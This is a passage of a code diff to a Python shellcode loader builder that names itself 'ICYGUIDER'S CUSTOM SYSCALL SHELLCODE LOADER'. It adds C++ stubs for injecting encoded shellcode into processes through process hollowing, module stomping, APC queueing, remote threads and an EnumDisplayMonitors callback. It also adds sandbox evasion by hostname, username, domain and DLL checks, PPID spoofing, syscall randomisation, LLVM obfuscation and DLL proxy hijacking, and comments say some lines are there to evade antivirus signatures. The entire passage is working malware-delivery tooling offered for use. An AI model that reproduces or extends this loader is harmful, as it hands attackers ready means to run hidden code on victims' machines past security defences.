+    std::cout << "remoteFuncAddress: " << remoteFuncAddress << std::endl;
+
+    SIZE_T shellcodeLen = sizeof payload_len;
+    SIZE_T bytesWritten2;
+
+    //res = NtAllocateVirtualMemory(processHandle, &funcAddress, 0, &shellcodeLen, MEM_COMMIT, 0x40);
+    //WriteProcessMemory(processHandle, funcAddress, shellcode, shellcodeLen, &bytesWritten);
+    res = NtProtectVirtualMemory(processHandle, &remoteFuncAddress, &shellcodeLen, 0x40, &oldProtect);
+    std::cout << "NtProtectVirtualMemory res (shellcode): " << std::hex << res << std::endl;
+    res = NtWriteVirtualMemory(processHandle, (LPVOID)((uintptr_t)remoteFuncAddress + (uintptr_t)0x340), decoded, shellcodeLen, &bytesWritten2);
+    //WriteProcessMemory(processHandle, f2, shellcode, shellcodeLen, &bytesWritten);
+    //res = NtProtectVirtualMemory(processHandle, &funcAddress, &shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);
+    std::cout << "NtWriteVirtualMemory res (shellcode): " << std::hex << res << std::endl;
+    HANDLE hThread2;
+    res = NtCreateThreadEx(&hThread2, GENERIC_EXECUTE, NULL, processHandle, funcAddress, NULL, FALSE, 0, 0, 0, NULL);
+    std::cout << "NtCreateThreadEx res (shellcode): " << std::hex << res << std::endl;
+
+    std::cout << "DONE" << std::endl;
+
+    NtClose(hThread);
+    NtClose(hThread2);
+    NtClose(processHandle);
+    return 0;
+"""
+
+process_hollow_stub = """
+    REPLACE_ME_GetSyscallStubP2
+
+    REPLACE_ME_SANDBOX_CALL
+    deC(REPLACE_ME_DECARG);
 
     //next few lines do nothing... but they help evade some AV signatures
     NTSTATUS res = -1;
@@ -252,7 +750,7 @@ process_hollow_stub = """
     PROCESS_BASIC_INFORMATION bi;
     ULONG tmp;
 
-    res = NtQueryInformationProcess(hProcess, 0, &bi, sizeof(bi), &tmp);
+    res = NtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)0, &bi, sizeof(bi), &tmp);
 
     if (res != 0){
         std::cout << "NtQueryInformationProcess FAILED to query created process, exiting: " << std::hex << res << std::endl;
@@ -356,6 +854,8 @@ process_hollow_stub = """
 """
 
 CurrentThread_stub = """
+    REPLACE_ME_GetSyscallStubP2
+
     HANDLE hProc = GetCurrentProcess();
     DWORD oldprotect = 0;
     PVOID base_addr = NULL;
@@ -364,7 +864,7 @@ CurrentThread_stub = """
     SIZE_T pnew = payload_len;
 
     REPLACE_ME_SANDBOX_CALL
-    deC(payload);
+    deC(REPLACE_ME_DECARG);
 
     NTSTATUS res = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
@@ -429,14 +929,61 @@ CurrentThread_stub = """
     res = NtWaitForSingleObject(thandle, -1, NULL);   
 """
 
+EnumDisplayMonitors_stub = """
+    REPLACE_ME_GetSyscallStubP2
+
+    HANDLE hProc = GetCurrentProcess();
+    DWORD oldprotect = 0;
+    PVOID base_addr = NULL;
+    SIZE_T bytesWritten;
+    SIZE_T pnew = payload_len;
+    NTSTATUS res;
+
+    REPLACE_ME_SANDBOX_CALL
+    deC(REPLACE_ME_DECARG);
+
+    res = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT, PAGE_READWRITE);
+
+    if (res != 0){
+        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
+        return 0;
+    }
+    else {
+        std::cout << "NtAllocateVirtualMemory allocated memory in the current process sucessfully." << std::endl;
+    }
+
+    res = NtWriteVirtualMemory(hProc, base_addr, decoded, pnew, &bytesWritten);
+
+    if (res != 0){
+        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
+        return 0;
+    }
+    else{
+        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
+    }
+
+    res = NtProtectVirtualMemory(hProc, &base_addr, &pnew, PAGE_EXECUTE_READ, &oldprotect);
+    if (res != 0){
+        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
+        return 0;
+    }
+    else{
+        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
+    }
+
+    EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)base_addr, NULL);
+"""
+
 QueueUserAPC_stub = """
+    REPLACE_ME_GetSyscallStubP2
+
     DWORD oldprotect = 0;
     PVOID base_addr = NULL;
     SIZE_T bytesWritten;
     SIZE_T pnew = payload_len;
 
     REPLACE_ME_SANDBOX_CALL
-    deC(payload);
+    deC(REPLACE_ME_DECARG);
 
     //next few lines do nothing... but they help evade some AV signatures
     NTSTATUS res = -1;
@@ -485,7 +1032,7 @@ QueueUserAPC_stub = """
         std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
     }
 
-    res = NtQueueApcThread(hThread, base_addr, NULL, NULL, NULL);
+    res = NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)base_addr, NULL, NULL, NULL);
 
     if (res != 0){
         std::cout << "NtQueueApcThread FAILED to add routine to APC queue: " << std::hex << res << std::endl;
@@ -510,6 +1057,8 @@ QueueUserAPC_stub = """
 """
 
 RemoteThreadSuspended_stub = """
+    REPLACE_ME_GetSyscallStubP2
+
     DWORD oldprotect = 0;
     PVOID base_addr = NULL;
     HANDLE thandle = NULL;
@@ -518,7 +1067,7 @@ RemoteThreadSuspended_stub = """
     SIZE_T pnew = payload_len;
 
     REPLACE_ME_SANDBOX_CALL
-    deC(payload);
+    deC(REPLACE_ME_DECARG);
 
     PROCESSENTRY32 entry;
     entry.dwSize = sizeof(PROCESSENTRY32);
@@ -619,13 +1168,15 @@ RemoteThreadSuspended_stub = """
 """
 
 RemoteThreadContext_stub = """
+    REPLACE_ME_GetSyscallStubP2
+
     DWORD oldprotect = 0;
     PVOID base_addr = NULL;
     SIZE_T bytesWritten;
     SIZE_T pnew = payload_len;
 
     REPLACE_ME_SANDBOX_CALL
-    deC(payload);
+    deC(REPLACE_ME_DECARG);
 
     //next few lines do nothing... but they help evade some AV signatures
     NTSTATUS res = -1;
@@ -673,7 +1224,7 @@ RemoteThreadContext_stub = """
         std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
     }
 
-    void *_loadLibrary = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
+    FARPROC _loadLibrary = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
     if (_loadLibrary == NULL) {
         std::cout << "[X] Error: Could not find address of LoadLibrary" << std::endl;
         return 0;
@@ -681,7 +1232,7 @@ RemoteThreadContext_stub = """
 
     HANDLE hThread;
 
-    res = NtCreateThreadEx(&hThread, MAXIMUM_ALLOWED, NULL, hProcess, _loadLibrary, NULL, TRUE, 0, 0, 0, NULL);
+    res = NtCreateThreadEx(&hThread, MAXIMUM_ALLOWED, NULL, hProcess, (PVOID)_loadLibrary, NULL, TRUE, 0, 0, 0, NULL);
 
     if (res != 0){
         std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
@@ -740,6 +1291,26 @@ invoke_sandbox_check = """
     std::cout << "Sandbox checks passed" << std::endl;
 """
 
+rundll_stub = """
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
+    //HANDLE threadhandle;
+    switch(dwReason){
+        case DLL_PROCESS_ATTACH:
+            main();
+            //threadhandle = CreateThread(NULL, 0, main, NULL, 0, NULL);
+            //CloseHandle(threadhandle);
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+    }
+    return TRUE;
+}
+"""
+
 def generateKey(length):
     letters = string.ascii_letters + string.digits
     key = ''.join(random.choice(letters) for i in range(length))
@@ -750,8 +1321,8 @@ def generateRandomSyscall(length):
     syscall = ''.join(random.choice(letters) for i in range(length))
     return syscall
 
-def main(stub, infile, outfile, key, process, method, no_randomize, verbose, dll_sandbox):
-    print("[+] ICYGUIDER'S CUSTOM SYSWHISPERS SHELLCODE LOADER")
+def main(stub, infile, outfile, key, process, method, no_randomize, verbose, sandbox, get_syscallstub, no_sandbox, obfuscator_LLVM, word_encode, dll, sandbox_arg, no_ppid_spoof, dll_proxy):
+    print("[+] ICYGUIDER'S CUSTOM SYSCALL SHELLCODE LOADER")
     method = method.lower()
     file_size = os.path.getsize(infile)
     if file_size > 10000 and method == "processhollow":
@@ -776,27 +1347,62 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, dll
         contents = file.read()
         file.close()
 
-    encrypted = []
-    for b in range(len(contents)):
-        test = contents[b]
-        for i in range(len(key)):
-            test = test ^ ord(key[i])
-        encrypted.append("{:02x}".format(test))
+    if word_encode == False:
+        encrypted = []
+        for b in range(len(contents)):
+            test = contents[b]
+            for i in range(len(key)):
+                test = test ^ ord(key[i])
+            encrypted.append("{:02x}".format(test))
 
-    output = "unsigned char payload[] = {"
+        stub = stub.replace("REPLACE_DECODE_FUNCTION", regularDecode)
 
-    count = 0
-    for x in encrypted:
-        if count < len(encrypted)-1:
-            output += "0x{},".format(x)
-        else:
-            output += "0x{}".format(x)
-        count += 1
+        output = "unsigned char payload[] = {"
 
-    output += "};"
+        count = 0
+        for x in encrypted:
+            if count < len(encrypted)-1:
+                output += "0x{},".format(x)
+            else:
+                output += "0x{}".format(x)
+            count += 1
 
-    stub = stub.replace("REPLACE_ME_PAYLOAD", output)
-    stub = stub.replace("REPLACE_ME_KEY", key)
+        output += "};"
+
+        stub = stub.replace("REPLACE_ME_SHELLCODE_VARS", regularShellcode)
+        stub = stub.replace("REPLACE_ME_PAYLOAD", output)
+        stub = stub.replace("REPLACE_ME_KEY", key)
+    else:
+        print("[+] Storing shellcode as english word list")
+        if os.path.exists("words_alpha.txt") == False:
+            print("[+] Downloading list of english words...")
+            urllib.request.urlretrieve('https://github.com/dwyl/english-words/raw/master/words_alpha.txt', "words_alpha.txt")
+        f = open("words_alpha.txt", "r")
+        wordlist = f.readlines()
+        f.close()
+        chosen = []
+        cwordstring = "char* words[256] = {"
+        for i in range(256):
+            selection = wordlist[random.randint(0, len(wordlist))].strip("\n")
+            cwordstring += '"{}", '.format(selection)
+            chosen.append(selection)
+        cwordstring = cwordstring[:-2]
+        cwordstring += "};"
+
+        fwordsstring = "char* filewords[{}] = {{".format(len(contents))
+
+        filewords = [None] * len(contents)
+        for i in range(len(contents)):
+            #print(contents[i])
+            filewords[i] = chosen[int(contents[i])]
+            fwordsstring += '"{}", '.format(filewords[i])
+
+        fwordsstring = fwordsstring[:-2]
+        fwordsstring += "};"
+        stub = stub.replace("REPLACE_DECODE_FUNCTION", wordDecode)
+        stub = stub.replace("REPLACE_ME_SHELLCODE_VARS", wordShellcode)
+        stub = stub.replace("REPLACE_ME_WORDLIST", cwordstring)
+        stub = stub.replace("REPLACE_ME_FILEWORDS", fwordsstring)
 
     if method == "processhollow":
         stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
@@ -821,14 +1427,89 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, dll
     if method == "currentthread":
         stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
         stub = stub.replace("REPLACE_STUB_METHOD", CurrentThread_stub)
+    if method == "modulestomping":
+        #Must use GetSyscallStub for Module Stomping. SysWhispers2 version is unstable, try at own risk.
+        get_syscallstub = True
+        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
+        stub = stub.replace("REPLACE_STUB_METHOD", module_stomping_stub)
+        stub = stub.replace("REPLACE_ME_PROCESS", process)
+        print("[+] Using {} for ModuleStomping".format(process))
+    if method == "enumdisplaymonitors":
+         stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
+         stub = stub.replace("REPLACE_STUB_METHOD", EnumDisplayMonitors_stub)
 
-    if dll_sandbox == True:
+    if word_encode == False:
+        stub = stub.replace("REPLACE_ME_DECARG", "payload")
+    else:
+        stub = stub.replace("REPLACE_ME_DECARG", "")
+
+    if get_syscallstub == True:
+        print("[+] Using GetSyscallStub for syscalls")
+        stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#pragma comment(lib, "ntdll")')
+        stub = stub.replace("REPLACE_GetSyscallStubP1", GetSyscallStubP1)
+        stub = stub.replace("REPLACE_ME_GetSyscallStubP2", GetSyscallStubP2)
+    else:
+        print("[+] Using SysWhispers2 for syscalls")
+        stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#include "Syscalls2.h"')
+        stub = stub.replace("REPLACE_GetSyscallStubP1", "")
+        stub = stub.replace("REPLACE_ME_GetSyscallStubP2", "")
+
+    if no_ppid_spoof == True:
+        print("[+] PPID Spoofing has been disabled")
+        stub = stub.replace("REPLACE_PPID_SPOOF", "")
+    else:
+        stub = stub.replace("REPLACE_PPID_SPOOF", "UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);")
+
+    if no_sandbox == True:
+        print("[+] Sandbox checks have been disabled")
+        stub = stub.replace("REPLACE_SANDBOX_CHECK", "")
+        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "")
+    elif sandbox == "dll":
         print("[+] Using DLL enumeration for sandbox evasion")
         stub = stub.replace("REPLACE_SANDBOX_CHECK", dll_sandbox_check)
         stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "getLoadedDlls();")
+    elif sandbox == "hostname":
+        print("[+] Using hostname enumeration for sandbox evasion")
+        stub = stub.replace("REPLACE_SANDBOX_CHECK", hostname_sanbox_check)
+        stub = stub.replace("REPLACE_ME_HOSTNAME", sandbox_arg)
+        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "hostcheck();")
+    elif sandbox == "username":
+        print("[+] Using hostname enumeration for sandbox evasion")
+        stub = stub.replace("REPLACE_SANDBOX_CHECK", username_sanbox_check)
+        stub = stub.replace("REPLACE_ME_USERNAME", sandbox_arg)
+        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "usercheck();")
+    elif sandbox == "domain":
+        print("[+] Using domain enumeration for sandbox evasion")
+        stub = stub.replace("REPLACE_SANDBOX_CHECK", domain_sanbox_check)
+        stub = stub.replace("REPLACE_ME_DOMAINNAME", sandbox_arg)
+        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "domaincheck();")
     else:
+        print("[+] Using sleep technique for sandbox evasion")
         stub = stub.replace("REPLACE_SANDBOX_CHECK", sandbox_check)
         stub = stub.replace("REPLACE_ME_SANDBOX_CALL", invoke_sandbox_check)
+
+    # Thanks tothi! https://github.com/tothi/dll-hijack-by-proxying
+    if dll_proxy != None:
+        dll = True
+        print("[+] Using {} for DLL Proxying".format(dll_proxy))
+        legit_dll = pefile.PE(dll_proxy)
+        dll_basename = os.path.splitext(dll_proxy)[0]
+
+        f = open("stub.def", "w")
+        f.write("EXPORTS\n")
+        for export in legit_dll.DIRECTORY_ENTRY_EXPORT.symbols:
+            if export.name:
+                f.write('{}={}.{} @{}\n'.format(export.name.decode(), dll_basename, export.name.decode(), export.ordinal))
+        f.close()
+
+    if dll == True:
+        print("[+] Generating DLL instead of exe")
+        stub = stub.replace("REPLACE_DLL_MAIN", rundll_stub)
+        verbose = False
+        if outfile == "a.exe":
+            outfile = "a.dll"
+    else:
+        stub = stub.replace("REPLACE_DLL_MAIN", "")
 
     #Randomize Syscall names
     f = open("Syscalls.h", "r")
@@ -856,9 +1537,30 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, dll
     print("[+] Saved new stub to stub.cpp")
     print("[+] Compiling new stub...")
     if verbose == True:
-        os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,console -o {}".format(outfile))
+        if obfuscator_LLVM == True:
+            print("[+] Using Obfuscator-LLVM to compile stub...")
+            # Feel free to modify the OLLVM flags to fit your needs.
+            os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -static -lpsapi -Wl,--subsystem,console -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
+        else:
+            os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,console -o {}".format(outfile))
     else:
-        os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -o {}".format(outfile))
+        if obfuscator_LLVM == True:
+            print("[+] Using Obfuscator-LLVM to compile stub...")
+            # Feel free to modify the OLLVM flags to fit your needs.
+            if dll == True and dll_proxy != None:
+                os.system("x86_64-w64-mingw32-clang++ stub.cpp stub.def -s -w -fpermissive -static -lpsapi -Wl,--subsystem,windows -shared -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
+            elif dll == True and dll_proxy == None:
+                os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -static -lpsapi -Wl,--subsystem,windows -shared -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
+            else:
+                os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -static -lpsapi -Wl,--subsystem,windows -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
+        else:
+            if dll == True and dll_proxy != None:
+                os.system("x86_64-w64-mingw32-g++ stub.cpp stub.def -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -shared -o {}".format(outfile))
+                os.system("rm stub.def")
+            elif dll == True and dll_proxy == None:
+                os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -shared -o {}".format(outfile))
+            else:
+                os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -o {}".format(outfile))
     if os.path.exists(outfile) == True:
         print("[!] {} has been compiled successfully!".format(outfile))
     else:
@@ -868,13 +1570,21 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, dll
 
 
 print(inspiration[1:-1])
-parser = argparse.ArgumentParser(description='ICYGUIDER\'S CUSTOM SYSWHISPERS SHELLCODE LOADER')
+parser = argparse.ArgumentParser(description='ICYGUIDER\'S CUSTOM SYSCALL SHELLCODE LOADER')
 parser.add_argument("file", help="File containing raw shellcode", type=str)
 parser.add_argument('-p', '--process', dest='process', help='Process to inject into (Default: explorer.exe)', metavar='explorer.exe', default='explorer.exe')
-parser.add_argument('-m', '--method', dest='method', help='Method for shellcode execution (Options: ProcessHollow, QueueUserAPC, RemoteThreadContext, RemoteThreadSuspended, CurrentThread) (Default: QueueUserAPC)', metavar='QueueUserAPC', default='QueueUserAPC')
+parser.add_argument('-m', '--method', dest='method', help='Method for shellcode execution (Options: ModuleStomping, QueueUserAPC, ProcessHollow, EnumDisplayMonitors, RemoteThreadContext, RemoteThreadSuspended, CurrentThread) (Default: QueueUserAPC)', metavar='QueueUserAPC', default='QueueUserAPC')
+parser.add_argument('-w', '--word-encode', action='store_true', help='Save shellcode in stub as array of English words')
 parser.add_argument('-nr', '--no-randomize', action='store_true', help='Disable syscall name randomization')
+parser.add_argument('-ns', '--no-sandbox', action='store_true', help='Disable sandbox checks')
+parser.add_argument('-np', '--no-ppid-spoof', action='store_true', help='Disable PPID spoofing')
+parser.add_argument('-l', '--llvm-obfuscator', action='store_true', help='Use Obfuscator-LLVM to compile stub')
+parser.add_argument('-g', '--get-syscallstub', action='store_true', help='Use GetSyscallStub instead of SysWhispers2')
 parser.add_argument('-v', '--verbose', action='store_true', help='Enable debugging messages upon execution')
-parser.add_argument('-d', '--dll-sandbox', action='store_true', help='Use DLL based sandbox checks instead of the standard ones')
+parser.add_argument('-d', '--dll', action='store_true', help='Generate a DLL instead of EXE')
+parser.add_argument('-dp', '--dll-proxy', dest='dll_proxy', metavar='apphelp.dll', help='Create Proxy DLL using supplied legitimate DLL (File must exist in current dir)')
+parser.add_argument('-s', '--sandbox', dest='sandbox', help='Sandbox evasion technique (Options: sleep, domain, hostname, username, dll) (Default: sleep)', metavar='domain', default='sleep')
+parser.add_argument('-sa', '--sandbox-arg', dest='sandbox_arg', help='Argument for sandbox evasion technique (Ex: WIN10CO-DESKTOP, testlab.local)', metavar='testlab.local')
 parser.add_argument('-o', '--outfile', dest='out', help='Name of compiled file', metavar='a.exe', default='a.exe')
 
 if len(sys.argv) < 2:
@@ -884,13 +1594,30 @@ args = parser.parse_args()
 try:
     if os.path.exists(args.out) == True:
         os.system("rm {}".format(args.out))
+    sandbox = args.sandbox.lower()
+    if args.no_sandbox == False:
+        if sandbox != "dll" and sandbox != "hostname" and sandbox != "domain" and sandbox != "username" and sandbox != "sleep":
+            print("[!] Invalid sandbox evasion technique provided!")
+            print("[+] Valid sandbox evasion techniques are: domain, hostname, username, dll, sleep")
+            sys.exit()
+        if sandbox == "hostname" and args.sandbox_arg == None:
+            print("[!] No hostname specified for hostname based sandbox evasion. Please supply it using the '-sa' flag.")
+            sys.exit()
+        if sandbox == "username" and args.sandbox_arg == None:
+            print("[!] No username specified for username based sandbox evasion. Please supply it using the '-sa' flag.")
+            sys.exit()
+        if sandbox == "domain" and args.sandbox_arg == None:
+            print("[!] No domain specified for domain based sandbox evasion. Please supply it using the '-sa' flag.")
+            sys.exit()
     method = args.method.lower()
-    if method != "queueuserapc" and method != "processhollow" and method != "remotethreadsuspended" and method != "remotethreadcontext" and method != "currentthread":
+    if method != "queueuserapc" and method != "modulestomping" and method != "functionstomping" and method != "processhollow" and method != "enumdisplaymonitors" and method != "remotethreadsuspended" and method != "remotethreadcontext" and method != "currentthread":
         print("[!] Invalid shellcode execution method provided!")
-        print("[+] Valid shellcode execution methods are: ProcessHollow, QueueUserAPC, RemoteThreadContext, RemoteThreadSuspended, CurrentThread")
+        print("[+] Valid shellcode execution methods are: ModuleStomping, QueueUserAPC, ProcessHollow, EnumDisplayMonitors, RemoteThreadContext, RemoteThreadSuspended, CurrentThread")
         sys.exit()
+    if args.llvm_obfuscator == True:
+        args.get_syscallstub = True
     key = generateKey(49)
-    main(stub, args.file, args.out, key, args.process, method, args.no_randomize, args.verbose, args.dll_sandbox)
+    main(stub, args.file, args.out, key, args.process, method, args.no_randomize, args.verbose, sandbox, args.get_syscallstub, args.no_sandbox, args.llvm_obfuscator, args.word_encode, args.dll, args.sandbox_arg, args.no_ppid_spoof, args.dll_proxy)
 except:
     raise
     sys.exit()
